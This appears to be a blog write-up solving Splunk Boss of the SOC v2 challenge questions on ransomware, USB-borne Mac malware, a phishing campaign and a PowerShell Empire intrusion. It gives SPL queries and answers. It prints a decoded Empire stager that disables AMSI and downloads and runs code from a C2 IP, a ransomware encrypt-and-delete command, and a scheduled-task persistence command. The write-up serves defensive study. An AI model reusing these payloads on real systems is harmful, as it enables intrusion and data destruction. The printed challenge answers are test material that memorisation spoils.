#### Question 22 (305): Mallory's critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. At what hour, minute, and second does this actually happen? Answer guidance: Provide the time in PDT. Use the 24h format HH:MM:SS, using leading zeroes if needed. Do not use Splunk's _time (index time).

When you first encountered this question, did you feel a bit lost? The biggest challenge is that the question doesn’t specify the exact year of the incident. Plus, there's ambiguity about which MacBook Mallory was using ? Her corporate one or her personal one.

From Question 17 (300), we already know that Mallory has two devices:
- Mallory's Personal Device: kutekitten.local
- Mallory's Corporate Device: MACLORY-AIR13S - mallory.kraeusen

Investigating incidents on a MacBook is often more difficult for me than on a Windows endpoint, but let's break it down step by step.

From previous questions, we know that many events occurred in 2017. So, let’s focus on August 18, 2017, and investigate both devices for any activity related to a PowerPoint presentation ~ `.pptx` file name extension.

```sql
index=botsv2 sourcetype=* kutekitten OR mallory.kraeusen OR MACLORY-AIR13S pptx.*
|reverse
```

The first recorded event comes from Mallory's corporate MacBook (`MACLORY-AIR13S`):

```json
{
  "name": "file_events",
  "hostIdentifier": "MACLORY-AIR13S.local",
  "calendarTime": "Fri Aug 18 21:50:43 2017 UTC",
  "unixTime": "1503093043",
  "decorations": {
    "host_uuid": "564D4B96-D1CC-1BA4-692F-8E85EFF6F3ED",
    "username": "mallorykraeusen"
  },
  "columns": {
    "action": "CREATED",
    "atime": "1503093022",
    "category": "Documents",
    "ctime": "1503093022",
    "gid": "20",
    "hashed": "1",
    "inode": "1146064",
    "md5": "a5310b3d4e66d3c89b7afc23a3dafe37",
    "mode": "0644",
    "mtime": "1266652800",
    "sha1": "766471724854ca43a5dde13bf0c5a1d7f09545fb",
    "sha256": "60d9561c8928438af979c6e76f2fc469651931d88005e8c2dfc091e3654cec75",
    "size": "3626025",
    "target_path": "/Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx.crypt",
    "time": "1503093023",
    "transaction_id": "11844119",
    "uid": "502"
  },
  "action": "added"
}
```
So, what does the event tell you about:

**Metadata**
- **Action:** `added` (new event recorded)
- **Index Time:** `Fri Aug 18 21:50:43 2017 UTC`
- **Host:** `MACLORY-AIR13S.local`
- **Event Type:** `file_events`

**File Details**
- **Action:** `CREATED`
- **Path:** `/Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx.crypt` -> **she doomed !**
- **Size:** `3.6 MB`
- **Permissions:** `0644` (Owner: RW, Group: R, Others: R)
- **Hashes:**  
  - **MD5:** `a5310b3d4e66d3c89b7afc23a3dafe37`
  - **SHA1:** `766471724854ca43a5dde13bf0c5a1d7f09545fb`
  - **SHA256:** `60d9561c8928438af979c6e76f2fc469651931d88005e8c2dfc091e3654cec75`

**Timestamps**
- **Accessed (`atime`):** `Aug 18, 2017 21:50:22 UTC` ~ **`Aug 18, 2017 14:50:22 PDT`**
- **Changed (`ctime`):** `Aug 18, 2017 21:50:22 UTC` ~ **`Aug 18, 2017 14:50:22 PDT`**
- **Modified (`mtime`):** `Feb 20, 2010 00:00:00 UTC` 
  
**User & System Info**
- **User:** `mallorykraeusen`
- **Host UUID:** `564D4B96-D1CC-1BA4-692F-8E85EFF6F3ED`

At first, I was confused because I thought the answer was index time. However, I realized I needed to check the event details and extract the access time (atime) and change time (ctime) in Unix format.

> ANSWER: 14:50:22
{: .prompt-info }

#### Question 23 (306): How many seconds elapsed between the time the ransomware executable was written to disk on MACLORY-AIR13 and the first local file encryption? Answer guidance: Use the index times (_time) instead of other timestamps in the events.
We already knew that's will alot easier for us if this case occured on windows machine, right ? Just have to look at Sysmon logs to determind which excutable find is suspicious 

![pic20](assets/images/botsv2/pic20.png)

![pic19](assets/images/botsv2/pic19.png)

```sql
index=botsv2 sourcetype=* MACLORY-AIR13S AND .crypt |reverse |head 1 
|append [search index=botsv2 sourcetype=* MACLORY-AIR13S Office |reverse |head 1]
|reverse
|table _time columns.target_path
|delta _time as Collapsed_Time
```

![21](assets/images/botsv2/pic21.png)

> ANSWER: 132
{: .prompt-info }

#### Question 24 (307): Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory's personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive.
This question seemed simple at first-it took me just a few minutes to extract the logs. But finding the correct answer? That took me an entire day!

If you’ve read my [Boss of the SOC v1 write-ups](https://phamthanhsang-cs.site/posts/BOTSV1/#question-25-205-what-is-the-name-of-the-usb-key-inserted-by-bob-smith), you’ll remember we had a similar challenge - identifying a USB device name.

The key to solving this question lies in the Vendor ID. From my BOTS v1 experience, I recalled that the infected USB device was a Mass Storage Device from Alco Micro Corp, with the following identifiers:

- Vendor ID: 058F
- Model ID: 6387

Armed with this information, I crafted the following SPL search query to locate USB devices:
```sql
index=botsv2 sourcetype=osquery_results host=kutekitten | search vendor
```
![pic22](/assets/images/botsv2/pic22.png)
_5 events only !_

```json
{
  "name": "pack_hardware-monitoring_usb_devices",
  "hostIdentifier": "kutekitten.local",
  "calendarTime": "Thu Aug 03 18:07:28 2017 UTC",
  "unixTime": "1501783648",
  "decorations": {
    "host_uuid": "00000000-0000-1000-8000-000C296A4C57"
  },
  "columns": {
    "model": "Mass Storage",
    "model_id": "6387",
    "removable": "1",
    "serial": "849083BA",
    "usb_address": "1",
    "usb_port": "1",
    "vendor": "Generic",
    "vendor_id": "058f"
  },
  "action": "added"
}
```

```json
{ 
   "action": "added"
   "calendarTime": "Thu Aug 03 18:17:12 2017 UTC"
   "columns": { 
     "model":                 
     "model_id": "4100"
     "removable": "1"
     "serial": "0701348CAE3C4831"
     "usb_address": "1"
     "usb_port": "1"
     "vendor":         
     "vendor_id": "13fe"
   },
   "decorations": {
     "host_uuid": "00000000-0000-1000-8000-000C296A4C57"
     "username": "mkraeusen"
   },
   "hostIdentifier": "kutekitten.local"
   "name": "pack_hardware-monitoring_usb_devices"
   "unixTime": 1501784232"
}
```
We got two different logs, let's check those two USB vendors, use [devicekb](https://www.devicekb.com/index.php) to check vendor name:
- The first one:
  - vendor_id: 058f
  - id: 6387
  - serial: 849083BA
![pic23](/assets/images/botsv2/pic23.png)

- The second one:
  - vendor_id: 13fe
  - id: 4100
  - serial: 0701348CAE3C4831
![pic24](/assets/images/botsv2/pic24.png)

At first, I tried submitting both vendor names with their serial numbers-nothing worked. I was completely stuck, digging through multiple logs, trying different combinations. It felt like I was chasing my own tail. 

Finally, I decided to check other write-ups and discovered the answer was simply "Alco" - the vendor name from the first USB device log!

Damn, I felt so dumb after spending an entire day overcomplicating things.

> ANSWER: Alco
{: .prompt-info }


#### Question 25 (308): What programming language is at least part of the malware from the question above written in?

```sql
index=botsv2 sourcetype=osquery_results host=kutekitten earliest=08/04/2017:01:18:00 latest=08/04/2017:01:19:30
| reverse
```

> ANSWER: perl
{: .prompt-info }

#### Question 26 (309): The malware from the two questions above appears as a specific process name in the process table when it is running. What is it?
```json
{
  "name": "pack_osx-proclaunch_ProcessesInUserSpace",
  "hostIdentifier": "kutekitten.local",
  "calendarTime": "Thu Aug 03 18:21:35 2017 UTC",
  "unixTime": "1501784495",
  "decorations": {
    "host_uuid": "00000000-0000-1000-8000-000C296A4C57",
    "username": "mkraeusen"
  },
  "columns": {
    "cmdline": "java XPC_FLAGS=0x0",
    "cwd": "/Users/mkraeusen",
    "name": "perl5.18",
    "path": "/usr/bin/perl5.18",
    "pid": "10802",
    "uid": "502"
  },
  "action": "added"
}
```
> ANSWER: java
{: .prompt-info }


#### Question 27 (310): The malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?
> ANSWER: eidk.duckdns.org
{: .prompt-info }


#### Question 28 (311): From the question above, what is the fully-qualified domain name (FQDN) of the second (alphabetically) contacted C&C server?
> ANSWER: eidk.hopto.org
{: .prompt-info }


#### Question 29 (312): What is the average Alexa 1M rank of the domains between August 18 and August 19 that MACLORY-AIR13 tries to resolve while connected via VPN to the corporate network? Answer guidance: Round to two decimal places. Remember to include domains with no rank in your average! Answer example: 3.23 or 223234.91
```sql
index=botsv2 sourcetype=pan* |search vpn
```
```sql
index=botsv2 sourcetype=stream:dns 24.8.40.184 OR 74.93.232.229
|table name{} | stats values(name{}) as domain
```
But Alexa 1M ranking is now retired so im unable to find the answer. 

> ANSWER: `no answer`
{: .prompt-warning }

#### Question 30 (313): Two .jpg-formatted photos of Mallory exist in Kevin Lagerfield's server home directory that have eight-character file names, not counting the .jpg extension. Both photos were encrypted by the ransomware. One of the photos can be downloaded at the following link, replacing 8CHARACTERS with the eight characters from the file name. https://splunk.box.com/v/8CHARACTERS After you download the file to your computer, decrypt the file using the encryption key used by the ransomware. What is the complete line of text in the photo, including any punctuation? Answer guidance: The encryption key can be found in Splunk.
![pic25](/assets/images/botsv2/pic25.png)

![pic26](/assets/images/botsv2/pic26.png)

![pic27](/assets/images/botsv2/pic27.png)

I used the 2nd hint and get that ransomware called Patcher and got IoC of Extorsion file
- IoC: README!.txt
- Source: [Patcher crypto-ransomware](https://www.welivesecurity.com/2017/02/22/new-crypto-ransomware-hits-macos/)

```sql
index=botsv2 sourcetype=ps host="MACLORY-AIR13" README!
```

![pic28](/assets/images/botsv2/pic28.png)
_cmdline: /usr/bin/find /Users/ -not -iname README!.txt -print -exec zip -0 -P TPq3NrjTLn2fSBZIxklL6ZRM5 {}.crypt {} ; -exec rm {} ; -exec touch -mt 201002130000 {}.crypt ;_

So what does this command line tell you about:
```
`find /Users/ -not -iname README!.txt -print`

This searches for all files in /Users/ except those named README!.txt.
The -print flag ensures that the matching files are displayed (though not needed for execution).
```
```
`-exec zip -0 -P TPq3NrjTLn2fSBZIxklL6ZRM5 {}.crypt {}`

For each file found, it creates a ZIP archive with:
-0: No compression (store files as-is).
-P TPq3NrjTLn2fSBZIxklL6ZRM5: Encrypts the ZIP file with password TPq3NrjTLn2fSBZIxklL6ZRM5.
{}.crypt {}:
The encrypted ZIP file is saved as <original_filename>.crypt.
The original file is added inside the .crypt archive.
```
```
`-exec rm {}`

Deletes the original file after encryption.
```

```
`-exec touch -mt 201002130000 {}.crypt`

Alters the timestamp of the encrypted file (.crypt):
201002130000: Sets the modification time to Feb 13, 2010, at 00:00.
This is likely an anti-forensic technique to make the files appear older and avoid detection by file monitoring tools.
```
So if there's a chance to install the image that question ask us about, might be we could see the content of the file by using encryption key - TPq3NrjTLn2fSBZIxklL6ZRM5.

> ANSWER: `no answer`
{: .prompt-warning }
 
### Series 400

#### Question 31 (400): A Federal law enforcement agency reports that Taedonggang often spearphishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?
Before digging into SPL to find the answer, I googled Taedonggang and found out it’s a North Korean beer brand. That fits the theme - North Korea is known for its hackers, and this CTF is all about BEER. Looks like Frothly has a dangerous competitor!

The question gives us a clear starting point:
- **Spearphishing attachment** (T1566.001): Malicious files sent via email.
- **Zip files**: Look for attachments with extensions like `.zip`, `.rar`, `.7z`, `.gz`, `.tar`, etc.

Here’s the SPL I used to hunt for suspicious email attachments:

```sql
index=botsv2 sourcetype=stream:smtp AND (attach_filename{}=*.zip OR attach_filename{}=*.rar OR attach_filename{}=*.tar OR attach_filename{}=*.gz OR attach_filename{}=*.7z) 
| reverse 
| spath sender 
| spath "receiver{}"  
| spath subject
| table _time sender receiver{} attach_filename{} subject
```

This search looks for emails with zipped attachments, showing the sender, recipients, filename, and subject for context.

![pic29](/assets/images/botsv2/pic29.png)

Only four events came back-all from the same sender, to Frothly employees, with the same attachment: `invoice.zip`.

It’s not immediately obvious if this was a targeted phishing campaign, but there are some red flags. To get more context, I checked the email body (which is usually more readable than headers):

```html
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  </head>
  <body>
    <div>
      As we have not received a service cessation letter, I am assuming that you might have accidentally overlooked this invoice ‘02/160000506500 (Unpaid)’ for 10,000 GBP. Should you wish to bring an end to the agreement please let us know. Otherwise early withdrawal penalties will apply next month.&nbsp;
      <br>
      Please refer to the attached document for payment details. Due to the personal nature of the account we have added a password to the document. Please enter the password (912345678).
    </div>
    <div align="center" style="padding-top:10px;padding-bottom:10px;font-family:Verdana;font-size:8pt;color:#000000;">
      <hr noshade color="#000000" width="50%" size="1">
      <a href="http://ymlp160.net/ugwybuusgsgwgeegguwysy" style="color:#000000;">Unsubscribe / Change Profile</a>
      <br>
      <a href="http://ymlp160.net/m/" style="color:#000000;">Powered by YMLP</a>
    </div>
    <img alt=" " height="1" src="http://t.ymlp160.net/zwovhesyslwhk/footer.gif" width="1" border="0">
  </body>
</html>
```

**Red flags:**
- The phrase “Otherwise early withdrawal penalties will apply next month” is classic social engineering-creating urgency or fear.
- “We have added a password to the document. Please enter the password (912345678).” Attackers often use password-protected zips to bypass email security scanning.
- Embedded links using HTTP (not HTTPS), like `http://ymlp160.net/m/` and `http://t.ymlp160.net/zwovhesyslwhk/footer.gif`, could lead to malicious sites.

With these indicators, it’s clear this is a phishing attempt. If anyone opens the attachment, we know where to start investigating next.

**Adversary:**  
- Jim Smith `<jsmith@urinalysis.com>`

**Victims:**  
- abungstein@froth.ly  
- klagerfield@froth.ly  
- btun@froth.ly  
- fyodor@froth.ly  

**Malicious content:**  
- `invoice.zip`  
- hxxp://t[.]ymlp160[.]net/  
- hxxp://ymlp160[.]net/  

**Tactic/Technique:**  
- Initial Access (TA0001) – Spearphishing Attachment (T1566.001)

> **ANSWER:** `invoice.zip`
{: .prompt-info }

#### Question 32 (401): The Taedonggang APT group encrypts most of their traffic with SSL. What is the "SSL Issuer" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.

This question is pretty tricky, so instead of jumping straight to the answer, I wanted to dig into the dataset to see what happened after the phishing campaign.

First, I wanted to know if any Frothly members actually fell for it and downloaded `invoice.zip` to their machine. Since `xmlwineventlog` contains all Sysmon logs, I used it as my sourcetype:

```sql
index=botsv2 sourcetype=xmlwineventlog AND invoice.zip
| reverse
```

![pic30](/assets/images/botsv2/pic30.png)

Only two events came back, both related to `invoice.zip` on the host `wrk-btun`. Let's focused on Sysmon Event ID 1 (Process Execution):

```sql
index=botsv2 sourcetype=xmlwineventlog AND invoice.zip AND EventID=1 
| table CommandLine ProcessId ParentCommandLine ParentProcessId
```
![pic31](/assets/images/botsv2/pic31.png)

This showed that BTun downloaded the zip, extracted it, and opened `invoice.doc` - a Word document, likely with a malicious macro (since `WINWORD.EXE` is involved). With the `/n` flag, so we could'nt trace the child process. So I decided to use timeline correlation to see what happened right after.

Since the event was at `08/24/2017:10:28:55`, let's checked for suspicious activity in the next 10 seconds:

```sql
index=botsv2 sourcetype=xmlwineventlog host=wrk-btun earliest="08/24/2017:10:28:55" latest="08/24/2017:10:29:10" AND CommandLine!=*Splunk*
| sort _time
```
`CommandLine` entries containing `Splunk` added to reduce noise since there was a bunch of stub related to Splunk Forwarder.

Four events came back, all Sysmon Event ID 1. I used `|table` to view the details:

![pic32](/assets/images/botsv2/pic32.png)
_Something truly appeared!_

A PowerShell process with a base64-encoded command - 90% i'll flag it right always with HIGH priority - suspicious content.

So, overall, it’s safe to assume that `invoice.doc` was a malicious macro document that launched a PowerShell payload. After decoding it with CyberChef, i could look into to see what it actually does.

```shell
# Disables AMSI (Antimalware Scan Interface) to evade detection
[REF].ASSEmblY.GeTTYPe('System.Management.Automation.AmsiUtils') | ? { $_ }
|% { $_.GetFIELd('amsiInitFailed', 'NonPublic,Static').SetVaLue($nuLl, $TruE) };

# Sets up network connection and browser impersonation
[SYsTEM.Net.SerVIcEPOinTMAnAGEr]::EXPEcT100CONtinue = 0;
$wC = NEw-OBjECT SysTem.NEt.WeBCliEnT;
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };

# Sets proxy and steals credentials
$Wc.PROXy = [System.NEt.WEBRequeST]::DefAUltWebPrOxy;
$WC.PRoxy.CREDeNtIAls = [SySteM.NET.CRedENtiAlCAChE]::DeFAulTNETWoRkCreDENTIalS;

# Decrypts and executes a downloaded payload in memory
$K = [SysTem.TExt.ENcOdiNG]::ASCII.GetBYTes('389288edd78e8ea2f54946d3209b16b8');
$WC.HeaDeRS.Add("Cookie", "session=jknXpoa7pUA0lDBnYiQvU9unHg=");
$ser = 'https://45.77.65.211:443';
$t = '/login/process.php';
$DATA = $WC.DoWnLoAdDaTa($SEr $t);
$IV = $DATa[0..3];
$dATa = $DaTA[4..$daTa.LeNGtH];
- joiN[CHar[]](& $R $data ($IV $K)) | IEX
```

This PowerShell script shows a sophisticated attack: disabling security features, impersonating a browser, bypassing SSL errors, stealing proxy credentials, and downloading/decrypting a payload from the attacker’s infrastructure-all in memory.

The question asks about the SSL Issuer. At first, I couldn’t find any related info, even though we knew the adversary’s infrastructure and that traffic was encrypted via HTTPS. After using two hints, i got this:  
> "Frothly currently only collects SSL data with Stream. Look at the sourcetype 'stream:tcp' for more information about SSL data."

Now it stupid easy to find the answer but my ultimate goal isnt get the answer but actually learn about the kill-chain, we gonna dig into in the next question i guess.

```sql
index=botsv2 sourcetype=stream:tcp 45.77.65.211 AND ssl_issuer!=""
| table ssl_issuer
| stats count by ssl_issuer
```

![pic33](/assets/images/botsv2/pic33.png)

This was super helpful-especially since Symantec failed to quarantine the malware and the adversary maintained persistence, with over 14,000 logs related to this malicious IP.

**Victim:**  
- wrk-btun

**Malicious contents:**  
- `https://45[.]77[.]65[.]211:443`
- `invoice.doc` (contains PowerShell script)

**Tactics / Techniques:**  
- **Execution (TA0002):**
  - Command and Scripting Interpreter: PowerShell
  - User Execution: Malicious File (T1204.002)
  - Exploitation for Client Execution (T1203)
- **Defense Evasion:**
  - Impair Defenses: Disable or Modify Tools (T1562.001)
  - Obfuscated Files or Information (T1027)
  - Deobfuscate/Decode Files or Information (T1140)
  - Process Injection: DLL Injection (T1055.001)
- **Command and Control:**
  - Application Layer Protocol: Web Protocols (T1071.001)
  - Ingress Tool Transfer (T1105)

> **ANSWER:** `C = US`
{: .prompt-info }

#### Question 33 (402): Threat indicators for a specific file triggered notable events on two distinct workstations. What IP address did both workstations have a connection with?
The question seems to ask us to investigate EDR/AV solutions to find the answer, but that would be a daunting task without any context.

Instead, I’ll focus on what actually happened and map it to the kill chain.

I got two keys from the question:
- First, 2nd stage malware was dropped onto BTun’s machine, which was then compromised and connected back to the adversary’s C2 infrastructure.
- Second, the adversary successfully controlled some Frothly machines via lateral movement base on the context of question.

Let’s see what we can find in the event logs.

I grabbed the suspicious PowerShell ProcessId (4976) as the ParentProcessId and looked for child processes generated from that PowerShell session.

![pic34](/assets/images/botsv2/pic34.png)

It looks like the adversary got a full remote shell on the machine, tried to enumerate the current user and group info, and also wanted to look at something in EventViewer-possibly for log tampering.

Back to timeline hunting, I found something really interesting:

```sql
index=botsv2 sourcetype=xmlwineventlog host=wrk-btun earliest="8/24/2017:10:32:00" latest="8/24/2017:10:33:00" AND EventID=1 AND CommandLine!=*Splunk*
| sort _time
| table UserID ProcessId ParentProcessId CommandLine ParentCommandLine
```

![pic35](/assets/images/botsv2/pic35.png)
_Ps command generated from EventViewer?!_

The adversary attempted to inject the first payload into Event Viewer. By getting that process ID, another payload was executed-again, base64 encoded.

```shell
[Ref].AsSEmbLY.GetTYPE('System.Management.Automation.AmsiUtils')|? { $_ }
|% { $_.GeTFIeLd('amsiInitFailed', 'NonPublic,Static').SEtVaLUE($nULl, $TRuE) };
[SYstem.NEt.SERvICEPOInTMAnagER]::EXPEct100ContiNue = 0;
$wC = NEW - ObjECt SYsTeM.NeT.WEbCliEnt;
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
$wc.HeAdeRS.AdD('User-Agent', $u);
$WC.Proxy = [SySTEm.Net.WeBREQUeSt]::DEfAulTWeBProxY;
$Wc.PROxy.CReDeNtIalS = [SystEm.NEt.CrEdEntiaLCacHe]::DeFAuLtNetWORkCREDeNtIAls;
$K = [SystEm.Text.EncODIng]::ASCII.GeTByTeS('389288edd78e8ea2f54946d3209b16b8');
$R = {
    $D, $K = $ARgs;
    $S = 0..255;
    0..255|% {
        $J = ($J $S[$_] $K[$_%$K.CouNt])%6;
        $S[$_], $S[$J] = $S[$J], $S[$_]
    };
    $D|% {
        $I = ($I 1)%6;
        $H = ($H $S[$I])%6;
        $S[$I], $S[$H] = $S[$H], $S[$I];
        $_ - BxOR$S[($S[$I] $S[$H])%6]
    }
};
$wc.HeadERs.ADd("Cookie", "session=lrtRHKkA6IL5h/d8Ekk6QsxyPvk=");
$ser = 'https://45.77.65.211:443';
$t = '/admin/get.php';
$DATA = $WC.DoWNLoaDDATA($SER $T);
$iV = $DAta[0..3];
$DatA = $dATa[4..$DaTa.lENGTh];
- JoIN[CHar[]](& $R $daTa ($IV $K))|IEX
```

This is very similar to the previous payload, just with a different session and path (`/admin/get.php`).

![pic36](/assets/images/botsv2/pic36.png)

Looking at these logs, it’s clear that BTun (Billy Tun) had administrator privileges.

Other indicators highlight malicious execution and evidence of lateral movement:
- Suspicious DLLs: `winsys32.dll`, `winsys64.dll`, `singlefile.dll`
- Use of `ftp.exe` and a C# file in `%temp%` (`_lvk8kdj.cmdline`)
- Domain: `hildegardsfarm.com`
- Scheduled task named `Updater`

The adversary used `net share` to look for ways to move laterally within Frothly’s network.

Another `whoami /user` command suggests the attacker may have gained access to another machine or escalated privileges to fully control the Frothly domain.

Since the adversary used `ftp` to download more malware, I checked the `stream:ftp` sourcetype to see what happened:

```sql
index=botsv2 sourcetype=stream:ftp AND (winsys32.dll OR winsys64.dll OR singlefile.dll) 
| reverse  
| table dest_ip src_ip src_mac filename
| rename dest_ip as apt_infra src_ip as victim_ip src_mac as victim_mac
```

![pic37](/assets/images/botsv2/pic37.png)

The attacker abused FTP to download `winsys64.dll` onto two Frothly machines. I wanted to dig deeper to see which users were affected:

```sql
index=botsv2 sourcetype=wineventlog AND ("00:0C:29:6F:D0:2F" OR "00:0C:29:F5:5E:8E" OR "10.0.2.107" OR "10.0.2.109")
| table user
| stats count by user
```

| user                           | count |
| ------------------------------ | ----- |
| WRK-KLAGERF$                   | 2040  |
| WRK-BTUN$                      | 1473  |
| ANONYMOUS LOGON                | 1181  |
| billy.tun@FROTHLY.LOCAL        | 763   |
| billy.tun                      | 520   |
| WRK-KLAGERF$@FROTHLY.LOCAL     | 456   |
| kevin.lagerfield@FROTHLY.LOCAL | 449   |
| kevin.lagerfield               | 429   |
| WRK-BTUN$@FROTHLY.LOCAL        | 43    |
| service3                       | 11    |
| service3@FROTHLY.LOCAL         | 9     |

So, three users were affected: `billy.tun`, `kevin.lagerfield`, and `service3`. We’ll uncover more about the adversary’s TTPs in the next questions, but based on this info, it’s safe to assume the attacker was trying to exfiltrate sensitive data from Frothly.

**Victims:**  
- billy.tun  
- kevin.lagerfield  
- service3  

**Malicious contents:**  
- winsys32.dll  
- winsys64.dll  
- singlefile.dll  
- https://45[.]77[.]65[.]211:443/admin/get[.]php  
- hildegardsfarm[.]com - 160[.]153[.]91[.]7  

**Tactics / Techniques:**  
- **Execution (TA0002):**  
  - Command and Scripting Interpreter: PowerShell (T1059.001)  
  - Ingress Tool Transfer (T1105)  
  - Compile After Delivery (T1127)  
- **Persistence (TA0003):**  
  - Scheduled Task/Job: Scheduled Task (T1053.005)  
- **Privilege Escalation (TA0004):**  
  - Scheduled Task/Job: Scheduled Task (T1053.005)  
- **Defense Evasion (TA0005):**  
  - Impair Defenses: Disable or Modify System Firewall (T1562.004)  
  - Obfuscated Files or Information (T1027)  
- **Discovery (TA0007):**  
  - System Owner/User Discovery (T1033)  
  - Network Share Discovery (T1135)  
- **Command and Control (TA0011):**  
  - Application Layer Protocol: Web Protocols (T1071.001)  

> **ANSWER:** `160.153.91.7`
{: .prompt-info }

#### Question 34 (403): Based on the IP address found in question 402, what domain of interest is associated with that IP address?

Since this is a follow-up question, I just ran a basic query to see the A record for that IP address from `stream:dns`:

```sql
index=botsv2 sourcetype=stream:dns AND 160.153.91.7
```

The domain associated with `160.153.91.7` is `hildegardsfarm.com`, which we already saw in the previous question.

> **ANSWER:** `hildegardsfarm.com`
{: .prompt-info }

#### Question 35 (404): What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?

Let’s continue mapping the kill chain. For **Persistence (TA0003)**, we see a scheduled task being created:

```shell
schtasks /Create /F /RU SYSTEM /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""
```

This command creates a daily task named `Updater` that runs a PowerShell command, which executes whatever is stored in the `debug` registry key. This is a classic persistence technique for running malicious payloads.

To see what’s actually stored in that suspicious registry key, I checked the logs using the `winregistry` sourcetype:

```sql
index=botsv2 sourcetype="winregistry" AND powershell.exe AND debug
| table _time host pid key_path data_type data
```

![pic38](/assets/images/botsv2/pic38.png)

After decoding the registry value with CyberChef, I confirmed it was a similar PowerShell script as before, but with different paths:
- `/admin/get.php`
- `/login/process.php`
- `/new.php`

Besides Billy Tun, Kevin was also affected. I checked Kevin's machine using the PID from the previous command:

```sql
index=botsv2 sourcetype=xmlwineventlog host=wrk-klagerf ParentProcessId=2936
| table _time CommandLine ProcessId
```

![pic39](/assets/images/botsv2/pic39.png)

After gaining control over Kevin’s machine, the adversary attempted to clear all logs using the LOLBIN `wevtutil.exe`.

Next, I checked the host `venus` for more suspicious activity:

```sql
index=botsv2 sourcetype=xmlwineventlog host=venus ParentProcessId=2988
| table _time CommandLine ProcessId
```

![pic40](/assets/images/botsv2/pic40.png)

Combining this with `stream:ftp` logs, I saw that after compromising the machine, the attacker downloaded `python` and used it to run `dns.py`-both pulled from the adversary’s FTP server.

To tie it all together, I correlated the timeline from when `winsys32.dll` first appeared (08/24/2017:10:36:49) to its last appearance (08/24/2017:11:20:24) on the `mercury` host. I then checked for download/upload activity via FTP in that window:

```sql
index="botsv2" sourcetype=stream:ftp AND 160.153.91.7 AND earliest="08/24/2017:10:36:49" AND latest="08/24/2017:11:20:24" AND filename!=""
| reverse
| table _time src_ip dest_ip filename method loadway
```

![pic41](/assets/images/botsv2/pic41.png)

This revealed all the malicious files downloaded from the FTP server. We now know that `winsys32.dll` was used to control the Frothly network, establish persistence, and transfer more tools for malicious purposes.

At first, I thought the answer was `dns.py`, but the question hints at something unusual for an American company. After using a hint and correlating the timeline, I found the answer.

The picture is much clearer now-I can see what the Taedonggang APT group did and their TTPs. But there’s one more thing to dig into: **lateral movement**.

What exactly in the payload enabled them to move laterally in the environment? How did they use Billy Tun's machine as an entry point to control Kevin’s and two other machines?

From earlier questions, we noticed a user named `service3`. But who is this user? Is it a normal account? I went back to my previous query to see if `service3` successfully logged on to any machine in the Frothly network:

```sql
index=botsv2 sourcetype=wineventlog AND ("00:0C:29:6F:D0:2F" OR "00:0C:29:F5:5E:8E" OR "10.0.2.107" OR "10.0.2.109") AND service3 AND EventCode=4624
| table _time Account_Name Source_Network_Address ComputerName Logon_Type
```

![pic42](/assets/images/botsv2/pic42.png)

In a short amount of time, this user logged into various computers in the network from the same source IP address: `10.0.2.107`. The logon type (3) indicates network access - one of the red flags for lateral movement.

This IP address is associated with `"00:0C:29:6F:D0:2F"`. Using the `WinHostMon` sourcetype, I found this originated from Billy Tun's workstation.

![pic43](/assets/images/botsv2/pic43.png)

So, after gaining a foothold on Billy’s workstation, the adversary created (or used) the `service3` account to move laterally within Frothly’s network. But how? Were they using RDP or some other tool?

After some research, I found that the adversary abused **WMI (Windows Management Instrumentation)** for lateral movement. Splunk even provides a detailed context for hunting this activity in this CTF challenge. You can read more here:  
[Splunk BOTS APT Scenario: WMI at Destination](https://bots.splunk.com/workshop/74YFSHR1r7vMCm1SaxRpu4/apt-scenario_wmi-at-destination)

**Victims:**  
- Billy Tun  
- Kevin Lagerfield  
- mercury host  
- venus host  

**Malicious contents:**  
- winsys32.dll  
- winsys64.dll  
- 나는_데이비드를_사랑한다.hwp  
- dns.py  

**Tactics / Techniques:**  
- **Defense Evasion (TA0005):**  
  - Indicator Removal: Clear Windows Event Logs (T1070.001)
- **Execution (TA0002):**
  - Windows Management Instrumentation (T1047) (*for lateral movement*)
- **Persistence (TA0003):**  
  - Scheduled Task/Job: Scheduled Task (T1053.005)  

> **ANSWER:** `나는_데이비드를_사랑한다.hwp`
{: .prompt-info }

#### Question 36 (405): What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith

This question reveals the capabilities of the Taedonggang APT. They've used PowerShell Empire as their post-exploitation framework.

As I mentioned in the previous question, Taedonggang used WMI for lateral movement within Frothly's environment. Now, we know the APT also used Empire – one of the most well-known red team frameworks. There's even a module for [`powershell/lateral_movement/invoke_wmi`](https://www.infosecmatter.com/empire-module-library/?mod=powershell/lateral_movement/invoke_wmi#:~:text=This%20page%20contains%20detailed%20information%20about%20how%20to,executes%20a%20stager%20on%20remote%20hosts%20using%20WMI.)

The file that executed PowerShell Empire on the first victim's workstation is `invoice.doc`, but I couldn’t find anything particularly interesting around this file – especially not the file hash.

The hint said this was an OSINT-based question and required looking up the file hashes externally. So, I skipped it.  
That said, just knowing that the adversary used Empire already gives us some insight into their TTPs.

#### Question 37 (406): What is the average Shannon entropy score of the subdomain containing UDP-exfiltrated data? Answer guidance: Cut off, not rounded, to the first decimal place. Answer examples: 3.2 or 223234.9

